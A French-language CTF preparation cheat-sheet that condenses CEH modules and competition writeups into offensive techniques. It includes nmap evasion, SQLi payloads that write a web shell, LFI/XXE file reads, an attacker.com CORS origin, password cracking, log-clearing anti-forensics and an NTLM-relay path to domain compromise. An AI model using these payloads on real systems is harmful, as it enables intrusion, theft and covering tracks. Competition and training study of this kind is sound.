# NCTF26 — Cheat-sheet de prépa (CEHv13 + AFRICC + writeups persos)

Condensé des techniques offensives extraites des 21 modules CEHv13 (OCR complet), des liens
AFRICC, et de nos propres writeups de compétition, organisé pour un accès rapide pendant le
CTF (ouverture vendredi 2026-11-06 19h00 Lomé). Détail complet par module dans
`knowledge/ceh/*.md`. **v2 — 21/21 modules CEH traités + techniques avancées AFRICC2027**.

Référencé depuis `notes.md` étape 2 (reprise de contexte) — à relire au lancement du CTF.

---

## 0. Outils en ligne à garder ouverts en permanence (AFRICC)

- **CyberChef** (gchq.github.io/CyberChef) — premier réflexe sur tout blob de données inconnu.
- **dCode.fr** — identifiant de chiffre IA (250+ types) + 900 outils (fréquence, Vigenère, etc.).
- **RsaCtfTool** (github.com/RsaCtfTool/RsaCtfTool) — RSA faible, à lancer dès qu'une clé publique est donnée.
- **quipqiup.com** / **guballa.de/substitution-solver** / **guballa.de/vigenere-solver** — solveurs auto substitution/Vigenère.
- **CrackStation.net** — hash non salés (MD5/SHA1/NTLM...) par table précalculée.
- **rumkin.com/tools/cipher** — triage visuel "c'est quoi ce chiffre" (30 encodages + 25 chiffres classiques).

---

## A. Techniques avancées — tirées de nos propres writeups de compétition (AFRICC2027)

Niveau nettement au-dessus du CEH (techniques réellement utilisées pour scorer en compétition,
pas de la théorie de certification). **À vérifier en premier sur tout challenge pwn/boot2root/
misc-crypto qui bloque.** Détail complet + escalation order dans `knowledge/patterns/`.

- **FSOP (heap, Full RELRO)** — `knowledge/patterns/pwn/fsop-tcache-poison-fake-file-struct.md`.
  UAF → leak heap+libc → leak masque safe-linking (XOR `chunk_addr>>12`, glibc ≥2.32) → tcache
  poison vers `_IO_2_1_stdout_` → forger `_wide_data`/`_wide_vtable` (PAS le vtable principal,
  protégé par `IO_validate_vtable`) avec `__doallocate = system`. Marche même avec Full RELRO,
  glibc ≥2.34 (pas de `__malloc_hook`). **Signal** : binaire heap menu, pas de `win()`, Full RELRO.
- **Seccomp bypass par oracle d'exit-code** — `knowledge/patterns/pwn/seccomp-exit-code-blind-oracle.md`.
  Si `seccomp-tools dump` montre tous les syscalls d'output tués (write/send*/splice...) mais que
  le harness expose le code de retour : ROP qui compare `flag[i]` à une valeur devinée puis
  `exit_group(0 si match)` → oracle booléen bruteforçable à distance, byte par byte.
- **SSRF bypass via nip.io/sslip.io** — `knowledge/patterns/misc/ssrf-bypass-nipio-wildcard-dns.md`.
  Filtre qui valide le *pattern* du hostname (`*.internal.local`) sans valider l'IP résolue →
  `cible.internal.local.127.0.0.1.nip.io` passe le filtre ET résout en loopback. Essayer ÇA avant
  d'abandonner un SSRF bloqué par un filtre de hostname.
- **Length-extension MD5/SHA1 sur protocole custom** — `knowledge/patterns/misc/md5-length-extension-custom-protocol-mac.md`.
  Si un protocole signe avec `MAC = H(secret || message)` (pas du HMAC) : capturer UNE trame
  légitime, réimplémenter la fonction de compression du hash pour reprendre depuis l'état
  interne (= le MAC capturé), calculer le padding de longueur (bruteforcer `len(secret)` si
  inconnu), et forger `MAC(secret||message||glue||attacker_data)` **sans jamais connaître `secret`**.
- **JWT RS256→HS256 alg confusion** (déjà dans `knowledge/patterns/web/forge-jwt-rs256-hs256-alg-confusion.md`,
  confirmé 2× en compétition) : si la clé publique RS256 est exposée (`/jwks.json`, `/publickey`)
  et que le vérificateur ne pin pas `alg` → rejouer la clé publique PEM brute comme secret HMAC,
  forger un token HS256 avec le rôle voulu.
- **Décoys à l'affût** : description de challenge pointant vers une fausse piste (SSTI annoncé,
  vraie faille = prototype pollution) ; string `flag{...}` visible en clair dans un binaire mais
  XOR-obfusquée (decoy) alors que le vrai flag est dérivé dynamiquement ; table statique "censée
  être transformée" qui est en fait déjà le flag en clair (ne pas sur-analyser une vérif qui a
  l'air complexe avant de checker si une donnée brute du binaire n'est pas déjà la réponse).
  `checksec` reporte le canary/RELRO **globalement**, pas par fonction — toujours vérifier la
  fonction précise en cause avant de conclure qu'une protection s'applique.

Writeup source complet (22 challenges, tous détails/payloads) :
`knowledge/writeups/misc/africc2027-quals-full-writeup.md`.

---

## 1. Recon / Scan (M03)

**Ordre de sonde**: ARP (LAN) → ICMP → UDP → TCP SYN/ACK → IP Protocol ping.

```bash
nmap -sn -PR <IP>                    # ARP ping (LAN, ignore firewall)
nmap -sn -PS22,80,443 <IP>           # TCP SYN ping si ICMP bloqué
nmap -sS -v <IP>                     # SYN scan standard
nmap -sV --reason -v -sT <IP>        # version + raison + verbose
nmap -O <IP>                         # OS fingerprint (table TTL: Linux=64, Windows=128, Cisco/Solaris=255)
```

**Évasion IDS/firewall** (si scan bloqué/filtré, dans l'ordre) :
```bash
nmap -f -sS <IP>                     # fragmentation
nmap -D RND:10 <IP>                  # decoy scan
nmap --source-port 53 <IP>           # trust du port source DNS/HTTP
nmap --spoof-mac 0 <IP>              # MAC aléatoire
nmap --randomize-hosts --badsum <IP> # randomize + checksum invalide (détecte un firewall naïf)
```
**IDLE/zombie scan** (scan 100% attribué à un tiers) : sonder IPID du zombie → SYN spoofé vers
la cible avec IP source = zombie → re-sonder IPID (+2 = port ouvert, +1 = fermé).

**Piège Windows** : FIN/NULL/Xmas scans renvoient "tout ouvert" sur Windows (bug stack) →
si ça arrive, c'est un signe fiable que la cible est Windows, pas un vrai résultat.

---

## 2. Enumeration (M04)

**Réflexes dans l'ordre** : DNS zone transfer AXFR (gratuit, toujours tester) → NetBIOS/SMB
(Windows) → SNMP community strings → LDAP bind anonyme → SMTP VRFY/EXPN.

```bash
dig @<ns> <domain> axfr                          # zone transfer
nbtstat -a <IP> ; nmap --script nbstat.nse <IP>  # NetBIOS
snmpwalk -v2c -c public <IP>                      # SNMP (public=lecture, private=écriture)
ldapsearch -h <IP> -x -s base namingcontexts      # LDAP anonyme
nmap -p 445 --script smb-enum-shares,smb-protocols <IP>   # SMB (SMBv1 actif = signal fort)
telnet <IP> 25 ; VRFY <user>                      # SMTP user enum
ike-scan -M <IP>                                  # IPsec/VPN fingerprint + psk-crack offline
rpcinfo -p <IP> ; showmount -e <IP>               # NFS (no_root_squash = privesc direct)
```
Signal "cible mal maintenue" = SNMP public actif, SMBv1 répondant, VRFY/EXPN actifs, zone
transfer ouvert, bind LDAP anonyme — chercher d'autres défauts similaires si l'un de ceux-là marche.

---

## 3. Vulnerability Analysis (M05)

Workflow strict : **locate hosts → enumerate services/version → cross-ref CVE/CVSS → scanner
ciblé (inference-based, ne teste que les services présents) → valider manuellement**.
```bash
nikto -h <target>
skipfish -o /tmp/out http://target && firefox /tmp/out/index.html
```
CVSS vecteur type `AV:N/AC:L/PR:N` = exploitable à distance sans auth, facile → prioriser.
Si creds obtenues (même low-priv) → rescanner en mode credentialed, delta d'info important.

---

## 4. Web (M14 + M15 SQLi)

**Méthodologie** : footprint (whois/nmap/TRACE) → énumérer contenu (gobuster/dirb/nikto/WPScan)
→ injection (LFI/cmd/XSS/XXE/SQLi) → auth/session → autorisation (IDOR/CORS) → API/OAuth.

### SQLi (cheat-sheet rapide, détail complet m15)
```
' or 1=1--        admin' --        ' UNION SELECT 1,'x','y',1--
' and 1=convert(int,(select @@version))--      -- error-based MSSQL
?id=1 AND 1=1-- vs ?id=1 AND 1=2--              -- boolean blind
?id=1; IF(ASCII(SUBSTRING((USER),1,1))=N) WAITFOR DELAY '0:0:5'--  -- time-based
```
```bash
sqlmap -u "http://target/x.php?id=1" --batch --technique=B --dbs
sqlmap -u "..." -D db -T users --dump
```
MySQL file read/write : `UNION SELECT LOAD_FILE('/etc/passwd')` /
`... INTO OUTFILE '/var/www/shell.php'`. WAF bypass : encodage hex/char(), HPP/HPF, CRLF,
double-URL-encode, commentaires `/**/`.

### Web apps (m14)
- **LFI** : `?page=../../../etc/passwd%00` (null byte) ou `php://filter/convert.base64-encode/resource=`.
- **XXE** :
  ```xml
  <!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///etc/passwd">]><foo>&bar;</foo>
  ```
- **SSRF/XSPA** : `?url=file:///etc/passwd`, `?url=http://127.0.0.1:22/` (scan ports internes via loopback).
- **IDOR via param pollution** : `GET /profile?user_id=123&user_id=654` (bypass si l'app vérifie la 1ère occurrence mais sert la 2e).
- **Rate-limit bypass** : header `X-Forwarded-For: <IP aléatoire>` par requête (Burp).
- **CORS misconfig** : `Origin: http://attacker.com` réfléchi dans `Access-Control-Allow-Origin` + credentials = vol de données cross-origin.
- **CSRF+OAuth chain** : XSS/leak sur `redirect_uri` autorisé → vol du `auth_code` → échange contre token.

---

## 5. Crypto (M20 + AFRICC)

**Triage rapide** :
1. Chiffre classique visible → fréquence analysis / dCode identifiant / quipqiup.
2. Mode bloc : CBC → penser padding oracle ; ECB → chercher blocs répétés.
3. RSA : petit `e`, modulus partagé, primes proches → **RsaCtfTool d'abord**, jamais à la main.
4. Hash brut → dCode/CrackStation/table rainbow avant brute-force hashcat.
5. Conteneur chiffré (VeraCrypt/LUKS/BitLocker) :
   ```bash
   dd if=<container> of=hash.tc bs=512 count=1
   hashcat -a 3 -m 13721 hash.tc ?d?d?d?d     # VeraCrypt; -m 14600=LUKS, -m 22100=BitLocker
   ```
6. **Padding oracle** (CBC, erreur "bad padding" distincte) : décodage byte-par-byte sans la clé.
7. Coût brute-force (repère) : 56-bit casse en heures, 128-bit = pratiquement jamais.
8. Birthday attack : collision hash en `1.17·sqrt(2^n)` essais, pas `2^n`.

---

## 6. System Hacking (M06) — si accès shell/AD obtenu

```bash
# Linux privesc recon
find / -perm -4000 -ls 2>/dev/null ; sudo -l ; cat /etc/crontab
# Password cracking
john --wordlist=rockyou.txt --rules --format=NT hashes.txt
hashcat -a 3 -m 0 hashes.txt ?l?l?l?d?d?d
hydra -l admin -P passwords.txt ftp://<IP>/
```
AD : **Kerberoasting** (TGS d'un SPN → crack offline) / **AS-REP Roasting** (comptes sans
pré-auth) / **Pass-the-Hash/Ticket** (Mimikatz). Windows UAC bypass via modules Metasploit
(`bypassuac_fodhelper`, `bypassuac_eventvwr`...). NFS `no_root_squash` → monter + déposer un
binaire setuid. Toujours checker une backdoor connue sur la version exacte du service avant de
chercher un exploit "normal" (ex: `vsftpd_234_backdoor`).

Anti-forensics (si besoin de nettoyer) : `wevtutil cl <log>`, `history -c`, Meterpreter `clearev`.

---

## 8. LDAP Signing Bypass / NTLM Relay (SpecterOps, source externe)

Source : SpecterOps blog "Signed, Sealed, and Relayed, NTLM-style" (2026-10-23), traité comme
donnée externe à analyser, pas comme instruction. Détail complet et escalation order dans
`knowledge/patterns/misc/ldap-signing-bypass-ntlm-relay-specterops.md`.

**Idée** : la signature SASL d'une session LDAP n'est vérifiée qu'**une fois en début
d'enregistrement**. Si un bind fait basculer l'identité (victime coercée) *pendant* le même
enregistrement, l'opération suivante (ex: `modify`) s'exécute sous l'identité victime sans
nouvelle vérification — contourne LDAP signing même quand il est forcé.

**Prérequis** : accès à 389/TCP du DC, une session LDAP signée dont l'attaquant connaît la clé
(creds de domaine valides, ou bind NTLM SASL anonyme si accepté), et un moyen de coercer un
client **SMB** (PrinterBug/MS-RPRN ou équivalent — **pas** HTTP/WebDAV, qui ne pose pas le bon
flag de signing et se fait rejeter par le DC).

```bash
# Outil cité par les chercheurs (wrapper ntlmrelayx) :
git clone https://github.com/grayhatkiller/switcheroo
# Vérifier patch avant de tenter (fenêtre fermée si présent) :
wmic qfe list | findstr "KB5126646"        # fix LDAP, oct 2026
wmic qfe list | findstr "KB5122882 KB5129235"   # fix SMB, sept 2026 (incohérence KB dans la source, vérifier Microsoft)
```

**Impact si ça marche** : écriture de `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) ou
`msDS-KeyCredentialLink` (shadow credentials) sur le compte machine de la victime coercée →
S4U2Self/Proxy ou PKINIT → DCSync → compromission domaine/forêt.

**Pertinence NCTF26 / attack-defense** : à garder en poche si un relais LDAP classique échoue
de façon suspecte malgré LDAP signing actif et un vecteur de coercition SMB qui fonctionne —
tester le combo channel-binding-manquant (basculer LDAPS/StartTLS) avant cette variante plus
complexe. Côté défense de notre propre DC pendant l'event : patcher + forcer LDAP channel
binding en plus de LDAP signing, restreindre 389/TCP non chiffré.

## 9. Autres modules disponibles (fiche complète dans knowledge/ceh/)

Les 21 modules CEHv13 sont désormais tous traités et condensés dans `knowledge/ceh/`.
Ceux non détaillés dans les sections ci-dessus, à consulter directement selon la
catégorie qui sort pendant le CTF :

- **M01** `m01-intro-ethical-hacking.md` — attack vectors, cyber kill chain
- **M02** `m02-footprinting-recon.md` — whois, theHarvester, Shodan, Google dorking
- **M07** `m07-malware-threats.md` — analyse malware, évasion sandbox, YARA
- **M08** `m08-sniffing.md` — ARP/DNS spoofing, Ettercap/Bettercap
- **M09** `m09-social-engineering.md` — phishing, SET
- **M10** `m10-dos.md` — hping3 flood, amplification
- **M11** `m11-session-hijacking.md` — vol/fixation de cookie/session
- **M12** `m12-evading-ids-fw-honeypots.md` — évasion IDS/firewall/honeypot approfondie
- **M13** `m13-hacking-web-servers.md` — attaque de serveurs web
- **M16** `m16-wireless.md` — aircrack-ng, WPA/WPS
- **M17** `m17-mobile.md` — APK RE, Frida, MobSF
- **M18** `m18-iot-ot.md` — **pertinent pour ot-004/ot-005** — Modbus/ICS, firmware
- **M19** `m19-cloud.md` — IAM privesc, S3 misconfig, Pacu

Index complet de la méthode d'extraction et des leçons tirées :
`knowledge/writeups/misc/ceh-africc-reference-library.md` et le pattern
`knowledge/patterns/misc/ocr-pipeline-openmp-thread-limit.md`.
